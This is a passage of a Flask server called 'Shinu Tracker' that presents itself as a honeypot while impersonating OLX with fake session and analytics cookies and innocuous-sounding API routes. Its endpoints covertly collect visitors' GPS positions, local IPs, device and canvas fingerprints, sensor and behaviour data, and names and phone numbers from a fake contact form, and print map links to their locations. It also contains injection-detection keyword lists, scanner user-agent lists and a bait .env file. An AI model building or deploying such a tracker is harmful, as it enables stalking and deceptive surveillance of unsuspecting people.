from flask import Flask, request, render_template_string, jsonify, g
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import json
import os
import re
import glob
import time
import uuid
import random
import hashlib
import sqlite3
from datetime import datetime
from collections import defaultdict
from threading import Lock
from logging.handlers import RotatingFileHandler
import logging
import requests
from user_agents import parse
from colorama import init, Fore, Style

# ── init ──────────────────────────────────────────────────────────
init(autoreset=True)

PASTA_LOGS = "logs_honeypot"
os.makedirs(PASTA_LOGS, exist_ok=True)

DB_PATH = os.path.join(PASTA_LOGS, "shinu.db")

# ── cores do terminal ─────────────────────────────────────────────
ROXO     = '\x1b[38;5;135m'
ROXO_ESC = '\x1b[38;5;93m'
ROXO_CLA = '\x1b[38;5;183m'
ROSA     = '\x1b[38;5;213m'
BRANCO   = '\x1b[38;5;255m'
CINZA    = '\x1b[38;5;245m'
VERDE    = '\x1b[38;5;120m'
VERMELHO = '\x1b[38;5;196m'
AMARELO  = '\x1b[38;5;220m'
BR       = Style.RESET_ALL

# ── logging ───────────────────────────────────────────────────────
logger = logging.getLogger("shinu")
logger.setLevel(logging.INFO)
fh = RotatingFileHandler(
    os.path.join(PASTA_LOGS, "shinu.log"),
    maxBytes=5 * 1024 * 1024,
    backupCount=3,
    encoding="utf-8",
)
fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(fh)

# ── banco SQLite ──────────────────────────────────────────────────
def init_db():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.executescript("""
        CREATE TABLE IF NOT EXISTS eventos (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            tipo        TEXT,
            ip          TEXT,
            timestamp   TEXT,
            pais        TEXT,
            cidade      TEXT,
            isp         TEXT,
            vpn         INTEGER DEFAULT 0,
            is_bot      INTEGER DEFAULT 0,
            dispositivo TEXT,
            dados_json  TEXT
        );
        CREATE TABLE IF NOT EXISTS scans (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            ip         TEXT,
            rota       TEXT,
            metodo     TEXT,
            user_agent TEXT,
            payload    TEXT,
            timestamp  TEXT
        );
        CREATE TABLE IF NOT EXISTS blacklist (
            ip        TEXT PRIMARY KEY,
            motivo    TEXT,
            timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_eventos_ip  ON eventos(ip);
        CREATE INDEX IF NOT EXISTS idx_eventos_tipo ON eventos(tipo);
        CREATE INDEX IF NOT EXISTS idx_scans_ip    ON scans(ip);
    """)
    con.commit()
    con.close()

init_db()

def db_inserir_evento(tipo, ip, geo, ua_parsed, dados_extras=None):
    try:
        con = sqlite3.connect(DB_PATH)
        con.execute("""
            INSERT INTO eventos
              (tipo, ip, timestamp, pais, cidade, isp, vpn, is_bot, dispositivo, dados_json)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        """, (
            tipo, ip,
            datetime.now().isoformat(),
            geo.get("country", ""),
            geo.get("city", ""),
            geo.get("isp", ""),
            1 if geo.get("vpn_detectado") else 0,
            1 if (ua_parsed or {}).get("is_bot") else 0,
            (ua_parsed or {}).get("browser", ""),
            json.dumps(dados_extras or {}, ensure_ascii=False),
        ))
        con.commit()
        con.close()
    except Exception as e:
        logger.error(f"DB erro: {e}")

def db_inserir_scan(ip, rota, metodo, ua, payload):
    try:
        con = sqlite3.connect(DB_PATH)
        con.execute("""
            INSERT INTO scans (ip, rota, metodo, user_agent, payload, timestamp)
            VALUES (?,?,?,?,?,?)
        """, (ip, rota, metodo, ua, payload[:500], datetime.now().isoformat()))
        con.commit()
        con.close()
    except Exception as e:
        logger.error(f"DB scan erro: {e}")

def db_blacklist_add(ip, motivo):
    try:
        con = sqlite3.connect(DB_PATH)
        con.execute("""
            INSERT OR REPLACE INTO blacklist (ip, motivo, timestamp)
            VALUES (?,?,?)
        """, (ip, motivo, datetime.now().isoformat()))
        con.commit()
        con.close()
    except Exception as e:
        logger.error(f"DB blacklist erro: {e}")

def db_is_blacklisted(ip) -> bool:
    try:
        con = sqlite3.connect(DB_PATH)
        r = con.execute("SELECT 1 FROM blacklist WHERE ip=?", (ip,)).fetchone()
        con.close()
        return r is not None
    except Exception:
        return False

# ── flask + limiter ───────────────────────────────────────────────
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024   # 2 MB máximo

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["300 per day", "60 per hour"],
    storage_uri="memory://",
)

# ── rate limit dinâmico por IP ────────────────────────────────────
_req_count = defaultdict(list)
_req_lock  = Lock()
LIMITE_RPM = 40

def _checar_flood(ip: str) -> bool:
    """Retorna True se o IP está em flood."""
    now = time.time()
    with _req_lock:
        _req_count[ip] = [t for t in _req_count[ip] if now - t < 60]
        _req_count[ip].append(now)
        if len(_req_count[ip]) > LIMITE_RPM:
            db_blacklist_add(ip, f"flood: {len(_req_count[ip])} req/min")
            return True
    return False

# ── constantes ────────────────────────────────────────────────────
VPN_KEYWORDS = [
    "vpn", "proxy", "tor", "hosting", "datacenter", "cloud",
    "server", "vps", "host", "digitalocean", "linode", "vultr",
    "amazon", "google cloud", "azure", "ovh", "hetzner",
]

SCANNERS_UA = [
    "sqlmap", "nikto", "nmap", "masscan", "zgrab", "nuclei",
    "dirbuster", "gobuster", "wfuzz", "burpsuite", "hydra",
    "metasploit", "python-requests", "go-http-client", "libwww",
    "scrapy", "wget", "httpclient", "okhttp", "curl/",
]

PADROES_INJECAO = {
    "sql":      ["'", '"', "--", ";", "OR 1=1", "UNION SELECT",
                 "DROP TABLE", "INSERT INTO", "xp_cmdshell"],
    "xss":      ["<script", "javascript:", "onerror=", "onload=",
                 "alert(", "document.cookie"],
    "path":     ["../", "..\\", "/etc/passwd", "C:\\Windows"],
    "cmd":      ["|", "&&", ";ls", ";cat", "`", "$("],
    "template": ["{{", "}}", "{%", "%}", "${"],
}

ROTAS_ISCA = {
    "/.env", "/admin", "/wp-admin", "/phpmyadmin",
    "/config.php", "/.git/config", "/backup.zip",
    "/api/admin", "/console", "/actuator",
    "/manager/html", "/.aws/credentials",
    "/etc/passwd", "/server-status",
}

# ═══════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════

def ip_do_request() -> str:
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or "desconhecido"


def geo_por_ip(ip: str) -> dict:
    if ip.startswith(("192.168.", "10.", "127.", "172.", "169.254.")):
        return {"status": "private", "mensagem": "IP privado/local"}
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            timeout=4,
            params={"fields": (
                "status,message,country,countryCode,"
                "regionName,city,zip,lat,lon,isp,org,as,query"
            )},
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return _enriquecer_geo(d)
    except Exception:
        pass
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=4)
        if r.status_code == 200:
            d = r.json()
            if d.get("success"):
                mapped = {
                    "status":      "success",
                    "country":     d.get("country", ""),
                    "countryCode": d.get("country_code", ""),
                    "regionName":  d.get("region", ""),
                    "city":        d.get("city", ""),
                    "zip":         d.get("postal", ""),
                    "lat":         d.get("latitude"),
                    "lon":         d.get("longitude"),
                    "isp":         d.get("isp", ""),
                    "org":         d.get("org", ""),
                    "as":          str(d.get("connection", {}).get("asn", "")),
                    "query":       ip,
                }
                return _enriquecer_geo(mapped)
    except Exception:
        pass
    return {"status": "fail", "mensagem": "Geolocalização indisponível"}


def _enriquecer_geo(d: dict) -> dict:
    isp_l = d.get("isp", "").lower()
    org_l = d.get("org", "").lower()
    d["vpn_detectado"] = any(kw in isp_l or kw in org_l for kw in VPN_KEYWORDS)
    m = re.search(r"AS(\d+)", d.get("as", ""))
    d["asn"]      = m.group(1) if m else ""
    d["asn_name"] = d.get("as", "")
    return d


def parse_ua(ua_string: str) -> dict:
    try:
        ua = parse(ua_string)
        return {
            "browser":         ua.browser.family,
            "browser_version": ua.browser.version_string,
            "os":              ua.os.family,
            "os_version":      ua.os.version_string,
            "device":          ua.device.family,
            "is_mobile":       ua.is_mobile,
            "is_tablet":       ua.is_tablet,
            "is_pc":           ua.is_pc,
            "is_bot":          ua.is_bot,
        }
    except Exception:
        return {
            "browser": "Desconhecido", "os": "Desconhecido",
            "is_mobile": False, "is_tablet": False,
            "is_pc": True, "is_bot": False,
        }


def detectar_scanner(ua: str) -> dict:
    ua_l = ua.lower()
    for s in SCANNERS_UA:
        if s in ua_l:
            return {"is_scanner": True, "ferramenta": s, "confianca": "alta"}
    suspeito = len(ua) < 15 or ua == "" or not any(c.isalpha() for c in ua)
    return {
        "is_scanner": suspeito,
        "ferramenta": "desconhecido",
        "confianca":  "media" if suspeito else "baixa",
    }


def detectar_injecao(texto: str) -> dict:
    tl = texto.lower()
    encontrados = {}
    for tipo, padroes in PADROES_INJECAO.items():
        hits = [p for p in padroes if p.lower() in tl]
        if hits:
            encontrados[tipo] = hits
    return {"tem_injecao": bool(encontrados), "tipos": encontrados}


def headers_fingerprint() -> dict:
    ordem = list(request.headers.keys())
    h_str = ",".join(ordem)
    return {
        "ordem":      ordem,
        "hash":       hashlib.md5(h_str.encode()).hexdigest(),
        "total":      len(ordem),
        "tem_accept": "Accept" in request.headers,
        "tem_origin": "Origin" in request.headers,
    }


def salvar_log(nome: str, dados: dict) -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    path = os.path.join(PASTA_LOGS, f"{nome}_{ts}.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(dados, f, ensure_ascii=False, indent=2)
    return path


def consolidar_sessao(ip: str):
    safe         = ip.replace(".", "_").replace(":", "_")
    session_file = os.path.join(PASTA_LOGS, f"sessao_{safe}.json")
    eventos      = []
    for fp in glob.glob(os.path.join(PASTA_LOGS, "*.json")):
        if fp == session_file:
            continue
        try:
            with open(fp, encoding="utf-8") as f:
                d = json.load(f)
            if d.get("ip") == ip or d.get("ip_publico") == ip:
                eventos.append(d)
        except Exception:
            continue
    if not eventos:
        return
    eventos.sort(key=lambda x: x.get("timestamp", ""))
    sessao = {
        "ip": ip,
        "resumo": {
            "total_eventos":   len(eventos),
            "tem_gps":         any(e.get("evento") == "gps" and e.get("lat") for e in eventos),
            "tem_ip_local":    any(e.get("evento") == "ip_local_webrtc" for e in eventos),
            "tem_contato":     any(e.get("evento") == "contato_falso" for e in eventos),
            "tem_canvas":      any(e.get("evento") == "canvas_fingerprint" for e in eventos),
            "primeiro_acesso": eventos[0].get("timestamp", ""),
            "ultimo_acesso":   eventos[-1].get("timestamp", ""),
        },
        "eventos": eventos,
    }
    with open(session_file, "w", encoding="utf-8") as f:
        json.dump(sessao, f, ensure_ascii=False, indent=2)


# ── ANSI pad helper ───────────────────────────────────────────────
_ansi_re = re.compile(r'\x1b\$[0-9;]*m')

def _pad(texto: str, n: int) -> str:
    limpo = _ansi_re.sub('', texto)
    diff  = len(texto) - len(limpo)
    return texto.ljust(n + diff)[:n + diff]


# ── imprimir acesso no terminal ───────────────────────────────────
def imprimir_acesso(now, ip, geo, ua, dados_raw, caminho, scanner_info):
    W = 50

    def linha(icone, label, valor):
        esq = f"║  {ROXO_CLA}{icone}  {label:<13}{BR}: "
        val = _pad(str(valor), W)
        print(f"{esq}{val} {ROXO}║{BR}")

    vpn_txt = f"{VERMELHO}⚠ DETECTADO{BR}"  if geo.get("vpn_detectado") \
              else f"{VERDE}✔ Limpo{BR}"
    bot_txt = f"{VERMELHO}SIM{BR}"           if ua.get("is_bot") \
              else f"{VERDE}NÃO{BR}"
    scan_txt= f"{VERMELHO}⚠ {scanner_info.get('ferramenta','?').upper()}{BR}" \
              if scanner_info.get("is_scanner") else f"{VERDE}NÃO{BR}"
    tipo    = ("Mobile" if ua.get("is_mobile") else
               "Tablet" if ua.get("is_tablet") else "PC")
    bat     = dados_raw.get("bateria_pct")
    bat_txt = (
        f"{bat}% — " + (
            f"{VERDE}Carregando ⚡{BR}"
            if dados_raw.get("carregando")
            else f"{AMARELO}Descarregando 🔋{BR}"
        )
    ) if bat is not None else "N/A"

    borda = f"{ROXO}{'═' * 66}{BR}"
    print(f"\n{ROXO}╔{borda}╗{BR}")
    print(f"{ROXO}║{BR}{'':^68}{ROXO}║{BR}")
    print(f"{ROXO}║  {ROSA}🚨  SHINU TRACKER — NOVO ACESSO DETECTADO"
          f"{'':>24}{ROXO}║{BR}")
    print(f"{ROXO}║{BR}{'':^68}{ROXO}║{BR}")
    print(f"{ROXO}╠{'═'*66}╣{BR}")

    linha("📅", "Data/Hora",   now.strftime("%d/%m/%Y %H:%M:%S"))
    linha("🌐", "IP Público",  ip)
    linha("🔍", "VPN/Proxy",   vpn_txt)
    linha("🤖", "Scanner",     scan_txt)

    if geo.get("status") == "success":
        loc = (f"{geo.get('city','?')} / "
               f"{geo.get('regionName','?')} / "
               f"{geo.get('country','?')}")
        linha("📍", "Localização", loc)
        linha("🏢", "ISP",         geo.get("isp", "N/A")[:W])
        linha("🗺 ", "Coords IP",  f"{geo.get('lat')}, {geo.get('lon')}")
        linha("🔢", "ASN",         geo.get("asn_name", "N/A")[:W])

    linha("🤖", "É Bot?",      bot_txt)
    linha("💻", "Dispositivo",
          f"{tipo} — {ua.get('browser','?')} "
          f"{ua.get('browser_version','')} / "
          f"{ua.get('os','?')}"[:W])
    linha("📺", "Tela",        dados_raw.get("tela", "N/A"))
    linha("🌍", "Timezone",    dados_raw.get("timezone", "N/A"))
    linha("🗣 ", "Idioma",     dados_raw.get("idioma", "N/A"))
    linha("⚙ ", "CPU cores",  dados_raw.get("cores_cpu", "N/A"))
    linha("💾", "RAM",         f"{dados_raw.get('memoria_gb','N/A')} GB")
    linha("📡", "Conexão",     dados_raw.get("conexao", "N/A"))
    linha("⚡", "Velocidade",  f"{dados_raw.get('velocidade_down','N/A')} Mbps")
    linha("🔋", "Bateria",     bat_txt)
    linha("🖥 ", "Headers FP", g.get("headers_hash", "N/A"))

    print(f"{ROXO}╠{'═'*66}╣{BR}")
    linha("📁", "Arquivo",     os.path.basename(caminho))
    print(f"{ROXO}╚{'═'*66}╝{BR}\n")


# ═══════════════════════════════════════════════════════════════════
# MIDDLEWARES
# ═══════════════════════════════════════════════════════════════════

@app.before_request
def middleware_global():
    ip = ip_do_request()

    # ── blacklist ────────────────────────────────────────────────
    if db_is_blacklisted(ip):
        logger.warning(f"[BLACKLIST] Bloqueado: {ip}")
        return "", 403

    # ── flood ────────────────────────────────────────────────────
    if _checar_flood(ip):
        logger.warning(f"[FLOOD] Bloqueado: {ip}")
        return "", 429

    # ── latência artificial (furtividade) ────────────────────────
    time.sleep(max(0.02, random.gauss(0.07, 0.03)))

    # ── headers fingerprint ──────────────────────────────────────
    fp = headers_fingerprint()
    g.headers_hash    = fp["hash"]
    g.headers_ordem   = fp["ordem"]
    g.timestamp_req   = time.time()


@app.after_request
def mascarar_headers(response):
    response.headers.pop("Server",       None)
    response.headers.pop("X-Powered-By", None)
    response.headers["Server"]               = "nginx/1.24.0"
    response.headers["X-Frame-Options"]      = "SAMEORIGIN"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Request-ID"]         = str(uuid.uuid4())

    if request.path == "/":
        response.set_cookie(
            "olx_session", value=uuid.uuid4().hex,
            max_age=3600, httponly=True, samesite="Lax"
        )
        response.set_cookie(
            "_ga",
            value=(f"GA1.2."
                   f"{random.randint(1000000000,9999999999)}."
                   f"{int(datetime.now().timestamp())}"),
            max_age=63072000,
        )
        response.set_cookie(
            "_fbp",
            value=(f"fb.1."
                   f"{int(datetime.now().timestamp()*1000)}."
                   f"{random.randint(100000000,999999999)}"),
            max_age=7776000,
        )
    return response


@app.errorhandler(413)
def payload_grande(e):
    ip = ip_do_request()
    salvar_log("ataque", {
        "evento":    "payload_gigante",
        "timestamp": datetime.now().isoformat(),
        "ip":        ip,
    })
    db_blacklist_add(ip, "payload gigante")
    return jsonify({"erro": "Payload muito grande"}), 413


# ═══════════════════════════════════════════════════════════════════
# ROTAS PRINCIPAIS
# ═══════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template_string(HTML_ISCA)


@app.route("/api/v1/analytics/event", methods=["POST"])
@limiter.limit("12 per minute", key_func=ip_do_request)
def coletar():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip           = ip_do_request()
    geo          = geo_por_ip(ip)
    ua           = parse_ua(dados.get("user_agent", ""))
    scanner_info = detectar_scanner(dados.get("user_agent", ""))
    now          = datetime.now()

    # detecta injeção nos campos de texto
    injecao = {}
    for campo in ["idioma", "plataforma", "timezone"]:
        val = str(dados.get(campo, ""))
        r   = detectar_injecao(val)
        if r["tem_injecao"]:
            injecao[campo] = r["tipos"]

    registro = {
        "evento":           "coleta_inicial",
        "timestamp":        now.isoformat(),
        "ip":               ip,
        "geo":              geo,
        "ua_parsed":        ua,
        "scanner_info":     scanner_info,
        "headers_fp":       g.get("headers_hash", ""),
        "injecao_detectada":injecao,
        "dispositivo":      dados,
    }

    caminho = salvar_log("coleta", registro)
    db_inserir_evento("coleta_inicial", ip, geo, ua, {
        "scanner": scanner_info,
        "injecao": injecao,
    })
    imprimir_acesso(now, ip, geo, ua, dados, caminho, scanner_info)
    consolidar_sessao(ip)

    if scanner_info.get("is_scanner") or injecao:
        db_blacklist_add(ip, f"scanner/injecao: {scanner_info.get('ferramenta')}")
        logger.warning(f"[SCANNER] {ip} — {scanner_info.get('ferramenta')}")

    logger.info(f"[ACESSO] {ip} | Bot:{ua.get('is_bot')} | VPN:{geo.get('vpn_detectado')}")
    return jsonify({"status": "ok"})


@app.route("/api/v1/network/probe", methods=["POST"])
@limiter.limit("10 per minute", key_func=ip_do_request)
def ip_local():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip_pub = ip_do_request()
    ip_loc = dados.get("ip_local", "N/A")

    salvar_log("ip_local", {
        "evento":     "ip_local_webrtc",
        "timestamp":  datetime.now().isoformat(),
        "ip_publico": ip_pub,
        "ip_local":   ip_loc,
    })
    db_inserir_evento("ip_local_webrtc", ip_pub, {}, {}, {"ip_local": ip_loc})
    print(f"{ROXO}[WebRTC]{BR} {ROXO_CLA}IP Local:{BR} {ip_loc} "
          f"{CINZA}|{BR} {ROXO_CLA}Público:{BR} {ip_pub}")
    consolidar_sessao(ip_pub)
    return jsonify({"status": "ok"})


@app.route("/api/v1/location/nearby", methods=["POST"])
@limiter.limit("5 per minute", key_func=ip_do_request)
def gps():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip_pub       = ip_do_request()
    lat, lon     = dados.get("lat"), dados.get("lon")
    acc, alt     = dados.get("acc"), dados.get("alt")
    erro         = dados.get("erro")
    heading      = dados.get("heading")
    speed        = dados.get("speed")

    registro = {
        "evento":     "gps",
        "timestamp":  datetime.now().isoformat(),
        "ip":         ip_pub,
        "lat":        lat,
        "lon":        lon,
        "precisao_m": acc,
        "altitude_m": alt,
        "heading":    heading,
        "speed":      speed,
        "erro":       erro,
    }
    caminho = salvar_log("gps", registro)
    db_inserir_evento("gps", ip_pub, {}, {}, registro)

    print(f"\n{ROXO}{'─'*66}{BR}")
    if erro:
        print(f"{AMARELO}[GPS] Negado:{BR} {erro}")
    else:
        print(f"{VERDE}[GPS] OBTIDO!{BR}")
        print(f"  {ROXO_CLA}Lat       :{BR} {lat}")
        print(f"  {ROXO_CLA}Lon       :{BR} {lon}")
        print(f"  {ROXO_CLA}Precisão  :{BR} {acc} m")
        if alt  is not None: print(f"  {ROXO_CLA}Altitude  :{BR} {alt} m")
        if heading is not None: print(f"  {ROXO_CLA}Direção   :{BR} {heading}°")
        if speed is not None:   print(f"  {ROXO_CLA}Velocidade:{BR} {speed} m/s")
        print(f"  {ROSA}Maps      :{BR} https://www.google.com/maps?q={lat},{lon}")
    print(f"  {CINZA}Arquivo   :{BR} {caminho}")
    print(f"{ROXO}{'─'*66}{BR}\n")

    consolidar_sessao(ip_pub)
    logger.info(f"[GPS] {ip_pub} — Lat:{lat} Lon:{lon} Acc:{acc}m")
    return jsonify({"status": "ok"})


@app.route("/api/v1/device/fingerprint", methods=["POST"])
def canvas():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip_pub = ip_do_request()
    registro = {
        "evento":         "canvas_fingerprint",
        "timestamp":      datetime.now().isoformat(),
        "ip":             ip_pub,
        "canvas_hash":    dados.get("canvas_hash", ""),
        "webgl_vendor":   dados.get("webgl_vendor", ""),
        "webgl_renderer": dados.get("webgl_renderer", ""),
        "gpu_vendor":     dados.get("gpu_vendor", ""),
        "gpu_renderer":   dados.get("gpu_renderer", ""),
        "webgl_version":  dados.get("webgl_version", ""),
                "max_textura":    dados.get("max_textura", ""),
        "webgl_exts":     dados.get("webgl_exts", []),
        "fonts":          dados.get("fonts", []),
        "plugins":        dados.get("plugins", []),
        "audio_hash":     dados.get("audio_hash", ""),
    }
    salvar_log("canvas", registro)
    db_inserir_evento("canvas_fingerprint", ip_pub, {}, {}, registro)

    print(f"{ROXO}[Canvas]{BR} "
          f"{ROXO_CLA}GPU:{BR} {dados.get('gpu_renderer','N/A')} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Hash:{BR} {str(dados.get('canvas_hash','N/A'))[:20]} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}IP:{BR} {ip_pub}")
    consolidar_sessao(ip_pub)
    return jsonify({"status": "ok"})


@app.route("/api/v1/chat/message", methods=["POST"])
def contato():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip_pub   = ip_do_request()
    nome     = dados.get("nome", "")
    telefone = dados.get("telefone", "")
    mensagem = dados.get("mensagem", "")

    # detecta injeção nos campos
    injecao_nome = detectar_injecao(nome)
    injecao_tel  = detectar_injecao(telefone)

    registro = {
        "evento":    "contato_falso",
        "timestamp": datetime.now().isoformat(),
        "ip":        ip_pub,
        "nome":      nome,
        "telefone":  telefone,
        "mensagem":  mensagem,
        "injecao":   {
            "nome":     injecao_nome,
            "telefone": injecao_tel,
        },
    }
    salvar_log("contato", registro)
    db_inserir_evento("contato_falso", ip_pub, {}, {}, registro)

    print(f"\n{ROXO}╔{'═'*50}╗{BR}")
    print(f"{ROXO}║{BR}  {ROSA}📞 CONTATO CAPTURADO{BR}{'':>30}{ROXO}║{BR}")
    print(f"{ROXO}╠{'═'*50}╣{BR}")
    print(f"{ROXO}║{BR}  {ROXO_CLA}Nome     :{BR} {nome:<38}{ROXO}║{BR}")
    print(f"{ROXO}║{BR}  {ROXO_CLA}Telefone :{BR} {telefone:<38}{ROXO}║{BR}")
    print(f"{ROXO}║{BR}  {ROXO_CLA}Mensagem :{BR} {mensagem[:38]:<38}{ROXO}║{BR}")
    print(f"{ROXO}║{BR}  {ROXO_CLA}IP       :{BR} {ip_pub:<38}{ROXO}║{BR}")
    if injecao_nome["tem_injecao"] or injecao_tel["tem_injecao"]:
        print(f"{ROXO}║{BR}  {VERMELHO}⚠ INJEÇÃO DETECTADA NOS CAMPOS!{BR}{'':>18}{ROXO}║{BR}")
    print(f"{ROXO}╚{'═'*50}╝{BR}\n")

    consolidar_sessao(ip_pub)
    return jsonify({"status": "ok"})


@app.route("/api/v1/device/sensors", methods=["POST"])
def sensores():
    dados = request.get_json(silent=True)
    if not dados or not isinstance(dados, dict):
        return jsonify({"status": "erro"}), 400

    ip_pub = ip_do_request()
    registro = {
        "evento":    "sensores_dispositivo",
        "timestamp": datetime.now().isoformat(),
        "ip":        ip_pub,
        "dados":     dados,
    }
    salvar_log("sensores", registro)
    db_inserir_evento("sensores_dispositivo", ip_pub, {}, {}, dados)

    acel = dados.get("aceleracao", {})
    ori  = dados.get("orientacao", {})
    print(f"{ROXO}[Sensores]{BR} "
          f"{ROXO_CLA}Acel:{BR} x={acel.get('x','?')} "
          f"y={acel.get('y','?')} "
          f"z={acel.get('z','?')} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Orientação:{BR} α={ori.get('alpha','?')}° "
          f"{CINZA}|{BR} {ROXO_CLA}IP:{BR} {ip_pub}")
    consolidar_sessao(ip_pub)
    return jsonify({"status": "ok"})


@app.route("/api/v1/user/behavior", methods=["POST"])
def comportamento():
    try:
        dados = json.loads(request.data)
    except Exception:
        dados = {}

    ip_pub = ip_do_request()
    tempo  = dados.get("tempo_pagina_ms", 0)

    registro = {
        "evento":    "comportamento_usuario",
        "timestamp": datetime.now().isoformat(),
        "ip":        ip_pub,
        "dados":     dados,
    }
    salvar_log("comportamento", registro)
    db_inserir_evento("comportamento_usuario", ip_pub, {}, {}, {
        "tempo_ms":   tempo,
        "cliques":    len(dados.get("cliques", [])),
        "movimentos": len(dados.get("movimentos_mouse", [])),
        "scroll_pct": dados.get("scroll_max_pct", 0),
    })

    print(f"{ROXO}[Comportamento]{BR} "
          f"{ROXO_CLA}Tempo:{BR} {tempo}ms "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Cliques:{BR} {len(dados.get('cliques',[]))} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Scroll:{BR} {dados.get('scroll_max_pct',0)}% "
          f"{CINZA}|{BR} {ROXO_CLA}IP:{BR} {ip_pub}")
    consolidar_sessao(ip_pub)
    return jsonify({"status": "ok"})


# ── rotas isca (captura scanners) ─────────────────────────────────
@app.route("/<path:rota_desconhecida>", methods=["GET","POST","PUT","DELETE"])
def capturar_scan(rota_desconhecida):
    ip    = ip_do_request()
    ua    = request.headers.get("User-Agent", "")
    rota  = "/" + rota_desconhecida
    corpo = request.get_data(as_text=True)

    scanner_info = detectar_scanner(ua)
    injecao      = detectar_injecao(rota + corpo)

    registro = {
        "evento":       "scan_detectado",
        "timestamp":    datetime.now().isoformat(),
        "ip":           ip,
        "rota":         rota,
        "metodo":       request.method,
        "user_agent":   ua,
        "headers":      dict(request.headers),
        "args":         dict(request.args),
        "body":         corpo[:500],
        "scanner_info": scanner_info,
        "injecao":      injecao,
        "geo":          geo_por_ip(ip),
        "eh_rota_isca": rota in ROTAS_ISCA,
    }
    salvar_log("scan", registro)
    db_inserir_scan(ip, rota, request.method, ua, corpo)

    if scanner_info.get("is_scanner") or injecao.get("tem_injecao"):
        db_blacklist_add(ip, f"scan: {rota}")

    print(f"{VERMELHO}[SCAN]{BR} "
          f"{ROXO_CLA}IP:{BR} {ip} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Rota:{BR} {rota} "
          f"{CINZA}|{BR} "
          f"{ROXO_CLA}Ferramenta:{BR} {scanner_info.get('ferramenta','?')}")

    # respostas realistas por tipo de rota
    if ".env" in rota or "config" in rota:
        return (
            "APP_ENV=production\n"
            "APP_KEY=base64:SHINU_FAKE_KEY\n"
            "DB_HOST=127.0.0.1\n"
            "DB_DATABASE=olx_prod\n"
            "DB_USERNAME=olx_admin\n"
            "DB_PASSWORD=Sup3rS3cr3t@2025\n",
            200,
            {"Content-Type": "text/plain"},
        )
    if "admin" in rota:
        return "", 403
    if "robots.txt" in rota:
        return (
            "User-agent: *\nDisallow: /admin\nDisallow: /api\nDisallow: /.env",
            200,
            {"Content-Type": "text/plain"},
        )
    return "", 404


# ── API stats ─────────────────────────────────────────────────────
@app.route("/api/stats")
def api_stats():
    stats = {
        "total_acessos":    0,
        "ips_unicos":       set(),
        "gps_coletados":    0,
        "contatos":         0,
        "scans":            0,
        "blacklistados":    0,
        "ultimo_acesso":    "",
        "top_paises":       defaultdict(int),
        "top_isps":         defaultdict(int),
        "top_cidades":      defaultdict(int),
        "acessos_por_hora": {str(h): 0 for h in range(24)},
        "dispositivos":     {"Mobile": 0, "Desktop": 0, "Tablet": 0},
        "vpns_detectadas":  0,
        "bots_detectados":  0,
        "eventos_recentes": [],
    }

    # lê do SQLite
    try:
        con = sqlite3.connect(DB_PATH)
        con.row_factory = sqlite3.Row

        # total e IPs únicos
        for row in con.execute("SELECT ip, tipo, timestamp, pais, cidade, isp, vpn, is_bot, dispositivo FROM eventos"):
            tipo = row["tipo"]
            ip   = row["ip"]
            ts   = row["timestamp"]

            if tipo == "coleta_inicial":
                stats["total_acessos"] += 1
                stats["ips_unicos"].add(ip)
                try:
                    hora = datetime.fromisoformat(ts).hour
                    stats["acessos_por_hora"][str(hora)] += 1
                except Exception:
                    pass
                if row["pais"]:
                    stats["top_paises"][row["pais"]] += 1
                if row["isp"]:
                    stats["top_isps"][row["isp"]]   += 1
                if row["cidade"]:
                    stats["top_cidades"][row["cidade"]] += 1
                if row["vpn"]:
                    stats["vpns_detectadas"] += 1
                if row["is_bot"]:
                    stats["bots_detectados"] += 1
                disp = row["dispositivo"] or ""
                if "mobile" in disp.lower() or "android" in disp.lower():
                    stats["dispositivos"]["Mobile"]  += 1
                elif "tablet" in disp.lower():
                    stats["dispositivos"]["Tablet"]  += 1
                else:
                    stats["dispositivos"]["Desktop"] += 1

            if tipo == "gps":
                stats["gps_coletados"] += 1
            if tipo == "contato_falso":
                stats["contatos"] += 1

            if ts > stats["ultimo_acesso"]:
                stats["ultimo_acesso"] = ts

        # scans
        stats["scans"] = con.execute("SELECT COUNT(*) FROM scans").fetchone()[0]

        # blacklist
        stats["blacklistados"] = con.execute("SELECT COUNT(*) FROM blacklist").fetchone()[0]

        # eventos recentes
        rows = con.execute("""
            SELECT tipo, ip, timestamp, pais, cidade
            FROM eventos
            ORDER BY timestamp DESC
            LIMIT 10
        """).fetchall()

        icones = {
            "coleta_inicial":        "🚨",
            "gps":                   "📍",
            "ip_local_webrtc":       "🔐",
            "canvas_fingerprint":    "🖼️",
